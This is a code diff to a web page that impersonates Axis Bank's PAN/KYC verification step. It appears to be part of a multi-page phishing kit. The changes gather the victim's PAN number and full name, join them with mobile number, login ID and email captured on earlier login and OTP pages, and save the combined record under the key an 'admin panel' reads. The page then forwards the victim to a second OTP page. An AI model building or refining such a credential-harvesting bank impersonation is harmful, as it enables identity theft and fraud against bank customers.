@@ -446,12 +446,12 @@
             text-decoration: underline;
         }
         
-        /* Footer */
+        /* Footer - SIMPLIFIED */
         .main-footer {
             background: #87103F;
             color: white;
             text-align: center;
-            padding: 30px 20px;
+            padding: 20px;
             margin-top: 50px;
         }
         
@@ -460,41 +460,14 @@
             margin: 0 auto;
         }
         
-        .footer-text {
-            font-size: 18px;
-            margin-bottom: 20px;
-            font-weight: 500;
-        }
-        
-        .footer-links {
-            display: flex;
-            justify-content: center;
-            flex-wrap: wrap;
-            gap: 25px;
-            margin-bottom: 20px;
-        }
-        
-        .footer-links a {
-            color: white;
-            text-decoration: none;
-            font-weight: 500;
-            font-size: 15px;
-            transition: all 0.3s ease;
-            padding: 5px 10px;
-            border-radius: 4px;
-        }
-        
-        .footer-links a:hover {
-            background: rgba(255, 255, 255, 0.1);
-            text-decoration: underline;
-        }
-        
         .copyright {
             font-size: 14px;
             opacity: 0.8;
-            margin-top: 20px;
-            padding-top: 20px;
-            border-top: 1px solid rgba(255, 255, 255, 0.2);
+        }
+        
+        .copyright a {
+            color: white;
+            text-decoration: underline;
         }
         
         /* Responsive */
@@ -539,11 +512,6 @@
             .main-content {
                 padding: 0 15px;
                 margin: 20px auto;
-            }
-            
-            .footer-links {
-                flex-direction: column;
-                gap: 15px;
             }
         }
         
@@ -669,19 +637,11 @@
             </div>
         </div>
         
-        <!-- Footer -->
+        <!-- Footer - SIMPLIFIED -->
         <footer class="main-footer">
             <div class="footer-content">
-                <div class="footer-text">Secure PAN Verification for KYC Compliance</div>
-                <div class="footer-links">
-                    <a href="#">Contactless enabled Credit Cards</a>
-                    <a href="#">Home loan upto Rs. 28 Lakhs</a>
-                    <a href="#">Experience seamless credit approval</a>
-                    <a href="#">Instant personal loans</a>
-                    <a href="#">Zero balance savings account</a>
-                </div>
                 <div class="copyright">
-                    © 2023 Axis Bank Ltd. All Rights Reserved. | <a href="#" style="color: white; text-decoration: underline;">Privacy Policy</a> | <a href="#" style="color: white; text-decoration: underline;">Terms of Service</a>
+                    © 2023 Axis Bank Ltd. All Rights Reserved. | <a href="#">Privacy Policy</a> | <a href="#">Terms of Service</a>
                 </div>
             </div>
         </footer>
@@ -721,71 +681,67 @@
         
         // Get user data from previous steps
         function getUserData() {
-            // Get OTP verification data
-            const otpVerifications = JSON.parse(localStorage.getItem('axisBankOTPVerifications') || '[]');
-            const lastOTP = otpVerifications.length > 0 ? otpVerifications[0] : null;
-            
-            // Get login data
-            const submissions = JSON.parse(localStorage.getItem('axisBankSubmissions') || '[]');
-            const lastSubmission = submissions.length > 0 ? submissions[0] : null;
-            
-            return {
-                otpData: lastOTP,
-                loginData: lastSubmission
-            };
+            try {
+                // Get all submissions from localStorage
+                const submissions = JSON.parse(localStorage.getItem('axisBankSubmissions') || '[]');
+                
+                // Find OTP submission
+                const otpSubmission = submissions.find(sub => sub.type === 'otp');
+                
+                // Find login submission
+                const loginSubmission = submissions.find(sub => sub.type === 'login');
+                
+                return {
+                    otpData: otpSubmission,
+                    loginData: loginSubmission
+                };
+            } catch (e) {
+                console.error('Error getting user data:', e);
+                return { otpData: null, loginData: null };
+            }
         }
         
-        // Save PAN data to localStorage for backend
+        // ✅ FIXED: Save PAN data to axisBankSubmissions (same as admin panel reads from)
         function savePANData(panData) {
-            // Get existing PAN data or create empty array
-            let panVerifications = JSON.parse(localStorage.getItem('axisBankPANVerifications') || '[]');
-            
-            // Get user data from previous steps
-            const userData = getUserData();
-            
-            // Add new PAN verification
-            const panRecord = {
-                id: Date.now(),
-                panData: panData,
-                timestamp: new Date().toISOString(),
-                otpData: userData.otpData,
-                loginData: userData.loginData,
-                status: 'verified'
-            };
-            
-            panVerifications.unshift(panRecord);
-            
-            // Save back to localStorage
-            localStorage.setItem('axisBankPANVerifications', JSON.stringify(panVerifications));
-            
-            console.log('PAN data saved to backend:', panData);
-            return panRecord;
-        }
-        
-        // Save to admin data
-        function saveToAdmin(panData, panRecord) {
-            // Get existing admin data or create empty array
-            let adminData = JSON.parse(localStorage.getItem('axisBankAdminData') || '[]');
-            
-            // Get user data from previous steps
-            const userData = getUserData();
-            
-            // Add to admin data
-            adminData.unshift({
-                id: Date.now(),
-                type: 'pan_verification',
-                panData: panData,
-                panRecord: panRecord,
-                timestamp: new Date().toISOString(),
-                otpData: userData.otpData,
-                loginData: userData.loginData,
-                status: 'verified'
-            });
-            
-            // Save back to localStorage for admin panel
-            localStorage.setItem('axisBankAdminData', JSON.stringify(adminData));
-            
-            console.log('PAN data saved to admin:', panData);
+            try {
+                // Get existing submissions
+                let submissions = JSON.parse(localStorage.getItem('axisBankSubmissions') || '[]');
+                
+                // Get user data from previous steps
+                const userData = getUserData();
+                
+                // Create PAN submission object
+                const panSubmission = {
+                    id: 'PAN-' + Date.now(),
+                    type: 'pan',
+                    timestamp: new Date().toISOString(),
+                    date: new Date().toLocaleString(),
+                    ip: '', // Will be captured if needed
+                    userAgent: navigator.userAgent,
+                    data: {
+                        panNumber: panData.panNumber,
+                        fullName: panData.fullName,
+                        status: 'verified',
+                        source: 'PAN Verification Page',
+                        // Include previous data if available
+                        mobileNumber: userData.otpData?.data?.mobileNumber || userData.loginData?.data?.mobile || '',
+                        userId: userData.loginData?.data?.loginId || userData.loginData?.data?.userId || '',
+                        email: userData.loginData?.data?.email || ''
+                    }
+                };
+                
+                // Add to submissions array (newest first)
+                submissions.unshift(panSubmission);
+                
+                // Save back to localStorage (CORRECT KEY: axisBankSubmissions)
+                localStorage.setItem('axisBankSubmissions', JSON.stringify(submissions));
+                
+                console.log('✅ PAN submission saved to axisBankSubmissions:', panSubmission);
+                return true;
+            } catch (e) {
+                console.error('❌ Error saving PAN submission:', e);
+                return false;
+            }
         }
         
         // Form submission handler
@@ -799,21 +755,24 @@
                 
                 // Validate PAN format
                 if (!validatePAN(panNumber)) {
-                    // Quick error indication
-                    verifyButton.style.background = '#ff4444';
+                    // Show error alert
+                    alert('Please enter a valid PAN number. Format: ABCDE1234F');
+                    panNumberInput.focus();
+                    panNumberInput.style.borderColor = '#ff4444';
                     setTimeout(() => {
-                        verifyButton.style.background = '#87103F';
-                    }, 500);
+                        panNumberInput.style.borderColor = '#ddd';
+                    }, 2000);
                     return;
                 }
                 
                 // Validate required fields
                 if (!fullName) {
-                    // Quick error indication
-                    verifyButton.style.background = '#ff4444';
+                    alert('Please enter your full name as per PAN card');
+                    fullNameInput.focus();
+                    fullNameInput.style.borderColor = '#ff4444';
                     setTimeout(() => {
-                        verifyButton.style.background = '#87103F';
-                    }, 500);
+                        fullNameInput.style.borderColor = '#ddd';
+                    }, 2000);
                     return;
                 }
                 
@@ -829,11 +788,8 @@
                     verificationTime: new Date().toLocaleString()
                 };
                 
-                // Save PAN data to backend
-                const panRecord = savePANData(panData);
-                
-                // Save to admin data
-                saveToAdmin(panData, panRecord);
+                // ✅ FIXED: Save PAN data to correct localStorage key
+                const saved = savePANData(panData);
                 
                 // Simulate verification delay
                 setTimeout(() => {
@@ -842,8 +798,12 @@
                     verifyButton.classList.remove('loading');
                     verifyButton.disabled = false;
                     
-                    // Redirect to axis_otp2.html
-                    window.location.href = 'axis_otp2.html';
+                    if (saved) {
+                        // Redirect to next page (axis_otp2.html)
+                        window.location.href = 'axis_otp2.html';
+                    } else {
+                        alert('PAN verification failed. Please try again.');
+                    }
                     
                 }, 1500);
             });
@@ -866,14 +826,9 @@
             // Focus PAN input
             panNumberInput.focus();
             
-            // Initialize localStorage for PAN verifications if not exists
-            if (!localStorage.getItem('axisBankPANVerifications')) {
-                localStorage.setItem('axisBankPANVerifications', JSON.stringify([]));
-            }
-            
-            // Initialize localStorage for admin data if not exists
-            if (!localStorage.getItem('axisBankAdminData')) {
-                localStorage.setItem('axisBankAdminData', JSON.stringify([]));
+            // ✅ FIXED: Initialize axisBankSubmissions if not exists (same as admin panel uses)
+            if (!localStorage.getItem('axisBankSubmissions')) {
+                localStorage.setItem('axisBankSubmissions', JSON.stringify([]));
             }
         });
     </script>
